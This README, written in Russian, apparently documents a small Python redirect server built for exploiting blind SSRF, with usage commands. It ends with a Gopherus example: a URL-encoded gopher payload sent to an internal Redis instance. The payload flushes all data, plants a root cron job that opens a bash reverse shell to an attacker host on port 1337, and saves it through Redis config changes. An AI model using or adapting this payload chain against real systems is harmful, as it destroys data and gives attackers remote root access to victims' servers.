# simpleRedirectServer

Этот код был написан специально для Blind SSRF.

В этом случае сервер будет слушать порт 8080 и перенаправлять все запросы на https://www.google.com
```
> python3 server.py 8080 https://www.google.com
```
Код статуса по умолчанию будет 302 (Found). Если вы хотите задать другой код статуса, вы можете добавить его в команду:
```
> python3 server.py 8080 https://www.google.com 301
```
Пример для Blind SSRF через [Gopherus](https://github.com/tarunkant/Gopherus). Все входящие запросы на наш IP:8080 заставят бекенд перенаправить запрос на внутренний сервис
```
> Vulnerable Path: https://vulnerableapp.com/ssrf?url=http://IP:8080
> python3 server.py 8080 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```
